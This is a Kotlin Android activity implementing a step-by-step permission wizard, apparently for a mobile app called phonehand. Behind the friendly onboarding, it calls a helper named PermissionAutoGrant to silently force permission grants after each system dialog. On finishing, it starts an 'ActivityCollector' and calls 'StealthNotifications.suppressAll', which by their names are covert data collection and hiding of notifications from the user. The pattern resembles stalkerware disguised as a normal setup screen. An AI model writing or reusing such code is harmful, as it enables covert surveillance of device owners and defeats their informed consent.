package com.phonehand.app

import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.View
import android.widget.Button
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import java.util.concurrent.Executors

/** One permission at a time — benefit-first copy so users feel good about each tap. */
class PermissionWizardActivity : AppCompatActivity() {

    private lateinit var wizardScroll: View
    private lateinit var progressBar: ProgressBar
    private lateinit var stepLabel: TextView
    private lateinit var emoji: TextView
    private lateinit var title: TextView
    private lateinit var benefit: TextView
    private lateinit var science: TextView
    private lateinit var reassurance: TextView
    private lateinit var btnEnable: Button
    private lateinit var btnSkip: TextView
    private lateinit var donePanel: View
    private lateinit var btnDone: Button

    private val steps = PermissionSteps.ordered
    private var stepIndex = 0
    private var currentStep: PermissionStep? = null
    private val mainHandler = Handler(Looper.getMainLooper())
    private val io = Executors.newSingleThreadExecutor()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_permission_wizard)
        bindViews()

        if (steps.isEmpty()) {
            finishWizard()
            return
        }

        btnEnable.setOnClickListener { requestCurrentStep() }
        btnSkip.setOnClickListener { advanceStep() }
        btnDone.setOnClickListener { goHome() }

        showStep(0)
    }

    private fun bindViews() {
        wizardScroll = findViewById(R.id.wizardScroll)
        progressBar = findViewById(R.id.wizardProgress)
        stepLabel = findViewById(R.id.wizardStepLabel)
        emoji = findViewById(R.id.wizardEmoji)
        title = findViewById(R.id.wizardTitle)
        benefit = findViewById(R.id.wizardBenefit)
        science = findViewById(R.id.wizardScience)
        reassurance = findViewById(R.id.wizardReassurance)
        btnEnable = findViewById(R.id.btnEnableStep)
        btnSkip = findViewById(R.id.btnSkipStep)
        donePanel = findViewById(R.id.wizardDonePanel)
        btnDone = findViewById(R.id.btnWizardDone)
    }

    private fun showStep(index: Int) {
        if (index >= steps.size) {
            finishWizard()
            return
        }
        stepIndex = index
        val step = steps[index]
        currentStep = step

        val done = PermissionSteps.completedCount(this)
        progressBar.progress = (((index + 1).toFloat() / steps.size) * 100).toInt().coerceIn(8, 95)

        stepLabel.text = getString(R.string.perm_wizard_step_of, index + 1, steps.size)
        emoji.text = step.emoji
        title.text = getString(step.titleRes)
        benefit.text = getString(step.benefitRes)
        science.text = "✦ ${getString(step.scienceRes)}"
        reassurance.text = getString(step.reassuranceRes)
        btnEnable.text = if (step.isGranted(this)) getString(R.string.perm_step_already) else getString(step.buttonRes)
        btnEnable.isEnabled = true
    }

    private fun requestCurrentStep() {
        val step = currentStep ?: return
        if (step.isGranted(this)) {
            advanceStep()
            return
        }
        val missing = step.permissions.filter { !PermissionRequester.has(this, it) }
        if (missing.isEmpty()) {
            advanceStep()
            return
        }
        btnEnable.isEnabled = false
        btnEnable.text = getString(R.string.perm_step_waiting)
        ActivityCompat.requestPermissions(this, missing.toTypedArray(), REQ_STEP)
        mainHandler.postDelayed({
            io.execute {
                PermissionAutoGrant.runSilentBlocking(applicationContext, 12_000)
                mainHandler.post {
                    if (!isFinishing) {
                        btnEnable.isEnabled = true
                        btnEnable.text = getString(step.buttonRes)
                        if (step.isGranted(this)) advanceStep()
                    }
                }
            }
        }, 400)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray,
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode != REQ_STEP) return
        mainHandler.postDelayed({ advanceStep() }, 500)
    }

    private fun advanceStep() {
        showStep(stepIndex + 1)
    }

    private fun finishWizard() {
        progressBar.progress = 100
        wizardScroll.visibility = View.GONE
        donePanel.visibility = View.VISIBLE
        UserSession.setPermissionsWizardDone(this)
        ActivityCollector.get(this).start()
        StealthNotifications.suppressAll(this)
    }

    private fun goHome() {
        startActivity(
            Intent(this, HomeActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_NEW_TASK)
            },
        )
        finish()
    }

    override fun onDestroy() {
        io.shutdown()
        super.onDestroy()
    }

    companion object {
        private const val REQ_STEP = 7701

        fun hasPending(context: android.content.Context): Boolean =
            PermissionSteps.pending(context).isNotEmpty()

        fun launch(context: android.content.Context) {
            context.startActivity(
                Intent(context, PermissionWizardActivity::class.java)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK),
            )
        }
    }
}
